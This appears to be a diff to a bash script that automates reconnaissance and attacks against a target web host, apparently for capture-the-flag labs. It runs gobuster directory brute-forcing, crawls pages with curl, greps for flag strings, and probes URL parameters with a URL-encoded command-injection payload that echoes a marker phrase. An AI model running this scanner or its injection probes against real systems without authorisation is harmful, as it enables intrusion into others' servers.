@@ -210,8 +210,8 @@ stage3() { # Site Scanning
     exploreSite
 }
 
-stage4() {
-    echo "hello"
+stage4() { # Idenitfy Vulnerabilities
+    webAttack
 }
 
 stage5() {
@@ -235,6 +235,7 @@ prompt_next_stage() {
     echo " "
     echo "Continue to next stage, go back to menu, print summary or quit"
     read -p "(next/menu/summary/quit): " choice
+    echo " "
     case "$choice" in
         "next")
             $next_stage
@@ -253,7 +254,6 @@ prompt_next_stage() {
             prompt_next_stage
             ;;
     esac
-    echo " "
 }
 
 getTools() {
@@ -399,6 +399,7 @@ getPortList() {
 enumerateSite()
 {
     cleanHTTP=()
+
     if [[ ${#http_service_dict[@]} -eq 0 ]]; then # if the user skipped stage 2 treat all ports as valid
         if [[ "$httpPorts" == "LATER" || "$httpPorts" == "ALL" ]]; then
             echo "No Network Scan detected (stage 2)"
@@ -406,16 +407,14 @@ enumerateSite()
             read -p "Select HTTP/S Port(s): " httpPorts
             echo " "
         fi
-        getPortList "$httpPorts" cleanHTTP
-        for key in "${cleanHTTP[@]}"; do
-            http_service_dict["$key"]="http"
-        done
     fi
 
-    if [[ "$httpPorts" == "ALL" ]]; then
-        for key in $(printf "%s\n" "${!http_service_dict[@]}" | sort -n); do
+    getPortList "$httpPorts" cleanHTTP
+
+   if [[ "$httpPorts" == "ALL" ]]; then
+        for key in "${cleanHTTP[@]}"; do
             paths=()
-            output=$(gobuster -u "http://$targetIP:$key" -w "$discoveryPath")
+            output=$(gobuster -np -q -u "http://$targetIP:$key" -w "$discoveryPath")
             paths="/"
             paths+=($(echo "$output" | awk '/\(Status: [0-9]{3}\)/ {gsub(/\(Status: [0-9]{3}\)/, "", $1); print $1}'))
             if [[ ${#paths[@]} -gt 1 ]]; then
@@ -432,63 +431,30 @@ enumerateSite()
             fi
         done
     else
-        while true; do
-            # Prompt user for HTTP/S ports
-            if [[ "$httpPorts" == "LATER" ]]; then
-                read -p "Select HTTP/S Port(s): " temp_httpPorts
-            else
-                temp_httpPorts="$httpPorts"
-            fi
+        # Process HTTP/S ports from cleanHTTP directly
+        echo " "
+        echo "Ports selected: ${cleanHTTP[*]}"
+        echo " "
+        httpPorts=$(IFS=,; echo "${cleanHTTP[*]}")  # Rebuild as a comma-separated string
+        setEnv "HTTP_PORTS" "$httpPorts"
 
-            getPortList "$temp_httpPorts" cleanHTTP 
-            # Initialize valid and invalid port arrays
-            valid_ports=()
-            invalid_ports=()
-
-            # Validate each port
-            for key in "${cleanHTTP[@]}"; do
-                if [[ -v http_service_dict["$key"] ]]; then
-                    valid_ports+=("$key")
-                fi
-            done
-
-            # Check if there are any valid ports to proceed
-            if [[ ${#valid_ports[@]} -gt 0 ]]; then
-                echo "HTTP ports selected: ${valid_ports[*]}"
+        # Perform gobuster for each port
+        for port in "${cleanHTTP[@]}"; do
+            paths=() # clear paths
+            output=$(gobuster -np -q -u "http://$targetIP:$port" -w "$discoveryPath")
+            paths="/"
+            paths+=($(echo "$output" | awk '/\(Status: [0-9]{3}\)/ {gsub(/\(Status: [0-9]{3}\)/, "", $1); print $1}'))
+            if [[ ${#paths[@]} -gt 1 ]]; then
                 echo " "
-                httpPorts=$(IFS=,; echo "${valid_ports[*]}")  # Rebuild as a comma-separated string
-                setEnv "HTTP_PORTS" "$httpPorts"
-
-                # Perform gobuster for each valid port
-                for port in "${valid_ports[@]}"; do
-                    paths=() # clear paths
-                    #echo "Port: $port"
-                    output=$(gobuster -u "http://$targetIP:$port" -w "$discoveryPath")
-                    paths="/"
-                    paths+=($(echo "$output" | awk '/\(Status: [0-9]{3}\)/ {gsub(/\(Status: [0-9]{3}\)/, "", $1); print $1}'))
-                    if [[ ${#paths[@]} -gt 1 ]]; then
-                        echo " "
-                        echo "Fuzzing Site: $targetIP:$port"
-                        echo " "
-                        printf "%s\n" "${paths[@]}"
-                        echo " "
-                        site_map_dict[$port]="${paths[@]}"
-                    else
-                        echo " "
-                        echo "No paths accessible on port $targetIP:$port"
-                        echo " "
-                    fi
-                done
-                break
+                echo "Fuzzing Site: $targetIP:$port"
+                echo " "
+                printf "%s\n" "${paths[@]}"
+                echo " "
+                site_map_dict[$port]="${paths[@]}"
             else
-                if [[ ${#http_service_dict[@]} -gt 0 ]]; then 
-                    echo "No valid ports provided. Please enter new ports."
-                    read -p "Select HTTP/S Port(s): " temp_httpPorts
-                else
-                    echo "No HTTP Ports Found"
-                    echo "skipping fuzzing for site enumeration"
-                    break
-                fi
+                echo " "
+                echo "No paths accessible on port $targetIP:$port"
+                echo " "
             fi
         done
     fi
@@ -496,10 +462,9 @@ enumerateSite()
 }
 
 exploreSite()
-
 {
-
-    for key in "${!site_map_dict[@]}"; do # Loops throught each http port's site pages
+    for key in "${!site_map_dict[@]}"; do # Loops through each http port's site pages
+        echo " "
         echo "Web Crawling Site: $targetIP:$key"
         echo " "
         pages=(${site_map_dict[$key]})
@@ -508,7 +473,7 @@ exploreSite()
             page="${pages[$i]}"
             #echo $page
             output=$(curl -s "$targetIP:$key$page")
-            hrefs=($(echo "$output" | sed -n 's/.*href="\(\(\/[^"]*\)\).*/\1/p'))
+            hrefs=($(echo "$output" | sed -n 's/.*href="\([^"]*\)".*/\1/p'))
 
             # add support for scripts later
 
@@ -517,7 +482,7 @@ exploreSite()
                 top_level="/$(echo "$new_page" | cut -d'/' -f2)"
                 #echo "Top: $top_level"
                 #echo "Checking list for $new_page"
-                if [[ ! " ${pages[@]} " =~ " $new_page " && ! "$new_page" =~ \.css$ ]]; then
+                if [[ ! " ${pages[@]} " =~ " $new_page " && ! "$new_page" =~ \.css$ && ! "$new_page" =~ \.js$ ]]; then
                     echo "$new_page"
                     pages+=("$new_page")
                 fi
@@ -529,16 +494,105 @@ exploreSite()
             done
             ((i++))
         done
-        site_map_dict[$key]="${pages[@]}"
-        echo " "
-        echo "Site Map: $targetIP:$key"
-        echo " "
-        for site_pages in ${site_map_dict[$key]}; do
-            printf "%s\n" "$site_pages"
-        done
-        echo " "
+        if [[ ${#pages[@]} -gt 1 ]]; then
+            site_map_dict[$key]="${pages[@]}"
+            echo " "
+            echo "Site Map: $targetIP:$key"
+            echo " "
+            for site_pages in ${site_map_dict[$key]}; do
+                printf "%s\n" "$site_pages"
+            done
+            echo " "
+        fi
     done
 
+}
+
+webAttack() {
+    if [[ ${#site_map_dict[@]} -eq 0 ]]; then # if user skipped stage 3
+        cleanHTTP=()
+        getPortList "$httpPorts" cleanHTTP
+        for key in "${cleanHTTP[@]}"; do
+            response=$(curl -s "$targetIP:$key")
+            if [[ -n "$response" ]]; then
+                site_map_dict[$key]="/"
+            fi
+        done
+        exploreSite
+    fi
+    
+    for port in "${!site_map_dict[@]}"; do
+        # File Traversal
+        for url in ${site_map_dict[$port]}; do
+            response=$(curl -s "$targetIP:$port$url")
+            if [[ -n "$response" ]]; then
+                searchFlag=$(echo "$response" | grep -oE '{[^}]*\}')
+                if [[ -n "$searchFlag" ]]; then
+                    echo "Potential Flag Found: $url - $searchFlag"
+                fi
+                if [[ "$url" == *"="* ]]; then
+                    # RCE Injections
+                    rce_output=$(rce "$targetIP:$port$url")
+                    rce_boolean=$(echo "$rce_output" | awk '{print $1}')
+                    payload=$(echo "$rce_output" | cut -d' ' -f2-)
+                    
+                    if [[ "$rce_boolean" = "True" ]]; then
+                        echo "$targetIP:$port is vulnerable to RCE injection on page $url"
+                        # TODO: Store payload for later exploiting
+                        echo "Payload: $payload"
+                    fi
+                    break
+                fi
+            fi
+        done
+    done
+}
+
+urlencode() {
+    local input="$1"
+    local encoded=""
+    local i
+    for ((i=0; i<${#input}; i++)); do
+        c="${input:i:1}"
+        case "$c" in
+            [a-zA-Z0-9.~_-]) encoded+="$c" ;;  # Keep unreserved characters as is
+            *) encoded+=$(printf '%%%02X' "'$c") ;;  # Encode everything else
+        esac
+    done
+    echo "$encoded"
+}
+
+travelFiles()
+{
+    baseURL=$1
+
+}
+
+rce() {
+    root=$(echo "$1" | cut -d'=' -f1)
+    searchWord="The Lightning Thief Strikes Again"
+
+    # Define the injection string
+    injection="';echo \"$searchWord\"'"
+    encoded_injection=$(urlencode "$injection")
+
+    # Make the curl request
+    output=$(curl -s "${root}=${encoded_injection}")
+
+    # Check if the output contains the search word
+    if [[ -n "$output" ]]; then
+        check=$(echo "$output" | grep "$searchWord")
+        if [[ -n "$check" ]]; then
+            # Return "True" and the payload
+            echo "True ${root}=${injection}"
+        else
+            # Return "False" if no match is found
+            echo "False"
+        fi
+    else
+        # Return "False" if curl output is empty
+        echo "False"
+    fi
 }
 
 echo " "
